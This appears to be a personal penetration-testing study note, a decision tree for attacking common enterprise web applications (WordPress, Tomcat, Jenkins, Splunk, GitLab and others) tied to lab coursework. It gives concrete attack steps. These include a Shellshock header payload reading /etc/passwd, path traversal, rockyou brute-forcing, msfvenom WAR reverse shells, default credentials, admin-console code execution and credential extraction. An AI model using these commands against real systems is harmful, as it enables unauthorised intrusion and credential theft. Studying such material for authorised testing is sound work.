# Common Applications, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise web applications.

**Universal fingerprint-first rule:** before trying any CVE or exploit, identify the exact version. Version strings live in: README/CHANGELOG/MANIFEST files, error page footers, Nmap service banners, login page titles, and `/help` endpoints. Once you have the version, search with `searchsploit <app> <version>` and MSF `search <app>`.

---

### Found a WordPress site — where do I start?

→ `wpscan --url http://<target> --enumerate`, one command for users, plugins, themes, version, upload directory listing
→ If upload directory listing is on: browse `/wp-content/uploads/YYYY/MM/` for files left publicly accessible
→ If you have creds or found a user: `wpscan --password-attack xmlrpc -t 20 -U <user> -P rockyou.txt --url <target>` (xmlrpc is faster and often less protected than wp-login.php)
→ For each discovered plugin: `curl /wp-content/plugins/<name>/readme.txt | grep "Stable tag"` → `searchsploit <plugin> <version>`
→ Suspect a plugin is vulnerable but no exact CVE? Try path traversal: `/wp-content/plugins/<name>/inc/.../file.php?param=/etc/passwd`
→ Got admin creds? Theme editor RCE → Appearance → Theme Editor → `404.php` → inject reverse shell → trigger via theme's 404.php URL
→ Theme editor reverts your edit ("Unable to communicate back with site")? Use plugin zip upload instead (no loopback check)
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.2. WordPress. Enumeration & Attack|ACA.2]], [[Web Applications#WordPress|Command Appendix]]

### Found a Joomla site

→ Version: `curl /README.txt | head -n 4` → "Joomla! 3.x version history"
→ Exact version: `curl /administrator/manifests/files/joomla.xml | grep '<version>'`
→ Password brute: `joomla-brute.py -u <url> -w rockyou.txt -usr admin`
→ Got admin? Extensions → Templates → select theme → edit error.php → inject reverse shell → trigger URL
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.3. Joomla. Enumeration & Attack|ACA.3]], [[Common Applications#Joomla|Command Appendix]]

### Found a Drupal site

→ Version: `curl /CHANGELOG.txt | grep -m1 Drupal`
→ Drupal 7 with admin: Enable PHP Filter module → Content → Basic page → set format to "PHP code" → insert reverse shell → Save = immediate RCE
→ Drupal 8+: look for CVEs in `searchsploit drupal <version>`; PHP Filter module removed in 8+
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.4. Drupal. Enumeration & Attack|ACA.4]], [[Common Applications#Drupal|Command Appendix]]

### Found Apache Tomcat

→ Version: error page footer, Nmap banner, or Documentation link on welcome page
→ Manager App accessible (`/manager/html`)? MSF `auxiliary/scanner/http/tomcat_mgr_login` to brute-force creds
→ Got Manager creds? Deploy a WAR (`msfvenom -p java/jsp_shell_reverse_tcp ... -f war`) → WAR file to upload → trigger by clicking the deployed app
→ Windows target + Tomcat < 9.0.17 + CGI enabled? CVE-2019-0232: fuzz `/cgi/FUZZ.bat` → inject via URL query string → MSF `exploit/windows/http/tomcat_cgi_cmdlineargs`
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.5. Tomcat. Enumeration & Attack (Manager + CGI CVE-2019-0232)|ACA.5]], [[Common Applications#Tomcat|Command Appendix]]

### Found Jenkins

→ Version: login (admin:admin default) → bottom-right of any page
→ Got admin? Manage Jenkins → Script Console → Groovy reverse shell → instant root (Jenkins usually runs as root/SYSTEM)
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.6. Jenkins. Script Console RCE|ACA.6]], [[Common Applications#Jenkins|Command Appendix]]

### Found Splunk (port 8000, HTTPS)

→ Version: Nmap banner or login page title
→ No auth / admin access? Manage Apps → Install app from file → upload `reverse_shell_splunk` tar.gz → fires as NT AUTHORITY\SYSTEM (Windows) or splunk user (Linux)
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.7. Splunk. App Install RCE|ACA.7]], [[Common Applications#Splunk|Command Appendix]]

### Found PRTG Network Monitor (port 8080)

→ Version: Nmap banner, bottom-left of web UI
→ Default creds: `prtgadmin:Password123`
→ Got admin? Setup → Notifications → Add → Execute Program → "Demo exe notification" → Parameter field as shell command → test (bell icon) → user created → CrackMapExec verify → Evil-WinRM
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.8. PRTG Network Monitor. RCE|ACA.8]], [[Common Applications#PRTG Network Monitor|Command Appendix]]

### Found GitLab

→ Version: register account → `/help`
→ Enumerate public repos: Projects → Explore → check config files and commit messages for passwords
→ User enumeration: `searchsploit gitlab 13` → 49821.sh user enum script
→ Got account + old version? `searchsploit gitlab <version>` → authenticated RCE → 49951.py
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.10. GitLab. Enumeration & RCE|ACA.10]], [[Common Applications#GitLab|Command Appendix]]

### Found a CGI endpoint on a Linux Apache server

→ Fuzz `/cgi-bin/FUZZ` with `.cgi`, `.sh`, `.pl` extensions
→ Test for Shellshock: `curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<target>/cgi-bin/<script>.cgi`
→ If output appears: inject reverse shell via the same User-Agent header
→ Any header the server passes to the CGI as an env var can carry the payload (Referer, Cookie, X-Forwarded-For)
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.11. Shellshock (CGI)|ACA.11]], [[Common Applications#Shellshock (CGI)|Command Appendix]]

### Found ColdFusion (port 8500)

→ `searchsploit coldfusion 8` → CVE-2009-2265 (50057.py), unauthenticated file upload + RCE
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.13. ColdFusion. Discovery & RCE|ACA.13]], [[Arctic|Arctic box writeup]]

### Found IIS — suspect hidden files/directories

→ Run `iis_shortname_scanner.jar` → reads HTTP status code differences to leak 8.3 short filenames
→ Extract 6-char prefix from result → `egrep -R ^<prefix> /usr/share/wordlists/ > list.txt` → `gobuster dir -x .aspx,.asp`
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.14. IIS Tilde Enumeration|ACA.14]], [[Common Applications#IIS Tilde Enumeration|Command Appendix]]

### Found a login form that queries LDAP

→ Try `*` as both username and password, unsanitized LDAP wildcard matches any entry
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.15. LDAP Authentication Bypass|ACA.15]]

### Found a web app that doesn't restrict which POST parameters it accepts

→ Read the source code if accessible (SSH, SCP, XXE): look for `if user['<param>'] == True` or equivalent privileged flag
→ Append the hidden parameter to your POST body: `username=test&password=test&active=1`
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.16. Web Mass Assignment|ACA.16]]

### Found a binary that connects to a database — need the credentials

→ `gdb ./<binary>` → `set disassembly-flavor intel` → `disas main` → find `SQLDriverConnect` call → `b SQLDriverConnect` → `run` → read connection string from RDX register at breakpoint
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.17. Applications Connecting to Services, gdb ODBC|ACA.17]]

### Found Oracle WebLogic (port 7001, T3 protocol)

→ `searchsploit weblogic <version>` or MSF `search weblogic`
→ MSF `multi/http/weblogic_admin_handle_rce`, path traversal + PowerShell stager
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.18. Other Notable Applications. WebLogic|ACA.18]]

### Found Nagios XI

→ Version: login → bottom-left of dashboard
→ `searchsploit nagios xi 5.7` → 49422.py, authenticated RCE
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.20. Skills Assessment II|ACA.20]], [[Common Applications#Nagios XI|Command Appendix]]

### Found osTicket or another support ticket system

→ Log in as a support agent → browse Closed/Resolved tickets → look for plaintext passwords sent to customers
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.9. osTicket. Credential Disclosure|ACA.9]]

### Need to find credentials hardcoded in a .NET DLL or EXE

→ Drag file onto dnSpy → browse source → search for `SqlConnection`, `password=`, `PWD=`
→ If obfuscated: drag onto de4dot first → drag cleaned output onto dnSpy
→ Memory dump alternative: run in x64dbg → Exit Breakpoint → Memory Map → RW MAP region → Dump → de4dot → dnSpy
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.21. Skills Assessment III, dnSpy DLL|ACA.21]], [[Common Applications#Thick Client. .NET Credential Extraction|Command Appendix]]

### Scoping a new assessment with multiple vHosts — starting from nothing

→ Add known IP + hostnames to `/etc/hosts` → `sudo nmap STMIP -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList`
→ Feed Nmap XML into EyeWitness or Aquatone for screenshots → identify app types visually
→ vHost fuzz: `gobuster vhost -u <domain> -w subdomains-top1million-5000.txt --append-domain`
→ For each discovered vHost: check for GitLab repos (may contain creds for other services)
→ See [[Attacking Common Applications (HTB Supplementary)#ACA.1. Application Discovery (EyeWitness + Aquatone)|ACA.1]], [[Attacking Common Applications (HTB Supplementary)#ACA.20. Skills Assessment II|ACA.20]]
